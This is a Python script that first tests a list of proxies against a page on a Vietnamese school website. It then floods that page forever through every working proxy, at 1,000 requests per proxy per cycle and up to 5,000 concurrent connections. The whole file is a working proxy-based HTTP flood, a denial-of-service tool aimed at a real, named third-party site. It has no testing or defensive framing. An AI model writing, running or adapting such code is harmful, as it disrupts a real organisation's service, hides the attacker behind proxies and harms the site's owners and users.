import asyncio
import aiohttp

# ================== CONFIG ==================
INPUT_FILE = "alive1.txt"      # initial list of proxies to test
OUTPUT_FILE = "a.txt"          # alive proxies saved here
TARGET_URL = "https://c3phucu.hungyen.edu.vn/tin-tuc/thoi-khoa-bieu-so-1-ca-chieu.html"
TIMEOUT = 10
CONNECTIONS_PER_PROXY = 1000   # hits per proxy per cycle
MAX_CONCURRENT = 5000
# ============================================


def make_proxy_url(proxy: str) -> str:
    proxy = proxy.strip()
    if proxy.startswith(("http://", "https://", "socks")):
        return proxy
    return f"http://{proxy}"


async def check_proxy(session: aiohttp.ClientSession, proxy: str) -> str | None:
    """Check if proxy works once"""
    try:
        async with session.get(TARGET_URL, proxy=make_proxy_url(proxy), timeout=TIMEOUT, ssl=False) as resp:
            if resp.status == 200:
                print(f"[+] WORKING: {proxy}")
                return proxy
            else:
                print(f"[-] DEAD: {proxy} (status {resp.status})")
    except asyncio.TimeoutError:
        print(f"[-] DEAD: {proxy} (timeout)")
    except aiohttp.ClientProxyConnectionError:
        print(f"[-] DEAD: {proxy} (proxy conn error)")
    except aiohttp.ClientHttpProxyError:
        print(f"[-] DEAD: {proxy} (http proxy error)")
    except aiohttp.ClientSSLError:
        print(f"[-] DEAD: {proxy} (SSL error)")
    except Exception as e:
        print(f"[-] DEAD: {proxy} ({type(e).__name__})")
    return None


async def hammer_once(session: aiohttp.ClientSession, proxy: str):
    """One request via proxy"""
    try:
        async with session.get(TARGET_URL, proxy=make_proxy_url(proxy), timeout=TIMEOUT, ssl=False) as resp:
            print(f"[+] EXTRA HIT via {proxy} ({resp.status})")
    except Exception as e:
        print(f"[!] Extra hit failed for {proxy} ({type(e).__name__})")


async def hammer_forever(alive: list[str]):
    """Infinite hammer loop for saved alive proxies"""
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT)

    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            tasks = []
            for proxy in alive:
                for _ in range(CONNECTIONS_PER_PROXY):
                    tasks.append(hammer_once(session, proxy))

            # Fire off all hammer requests this round
            await asyncio.gather(*tasks)


async def main():
    # === First run: check proxies ===
    with open(INPUT_FILE, "r", encoding="utf-8") as f:
        proxies = [line.strip() for line in f if line.strip()]

    alive = []
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT)

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [check_proxy(session, proxy) for proxy in proxies]
        results = await asyncio.gather(*tasks)
        alive = [p for p in results if p]

    # Save alive proxies
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(alive))

    print(f"\n[!] {len(alive)} alive proxies saved to {OUTPUT_FILE}")

    # === After first check: hammer only ===
    if alive:
        await hammer_forever(alive)
    else:
        print("[!] No alive proxies found. Exiting.")


if __name__ == "__main__":
    asyncio.run(main())
